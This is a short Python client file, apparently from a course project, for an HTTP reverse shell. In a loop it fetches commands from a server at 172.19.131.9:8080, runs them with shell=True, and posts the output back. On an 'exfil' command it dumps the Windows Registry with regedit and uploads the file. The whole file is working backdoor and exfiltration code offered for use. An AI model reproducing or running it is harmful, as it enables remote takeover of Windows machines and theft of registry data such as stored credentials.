'''
This is the client file for a HTTP Reverse Shell. This should receive
commands from server.py and execute them on the machine that hosts this
file, whilst exfiltrating data found in the Windows Registry.

Authors: James Barr, Demarcus Campbell, Tucker Simpson
HTTP Reverse Shell Project w/ Registry Exfiltration
'''

import requests as r
from subprocess import Popen, PIPE, call
from os import environ
from time import sleep

while True:
    request = r.get("http://172.19.131.9:8080")
    command = request.text

    if "exit" in command:
        break

    elif "exfil" in command:
        ExfilCMD = call("regedit /e %TEMP%\RegData.reg",shell=True)
        sleep(5)
        regFile = {'file': open(environ["TEMP"]+"\\RegData.reg", "rb")}
        sleep(5)
        r.post(url="http://172.19.131.9:8080/export", files=regFile)

    else:
        CMD = Popen(command,shell=True,stdout=PIPE,stderr=PIPE,stdin=PIPE)
        r.post(url="http://172.19.131.9:8080", data=CMD.stdout.read())
        r.post(url="http://172.19.131.9:8080", data=CMD.stderr.read())
    sleep(3)
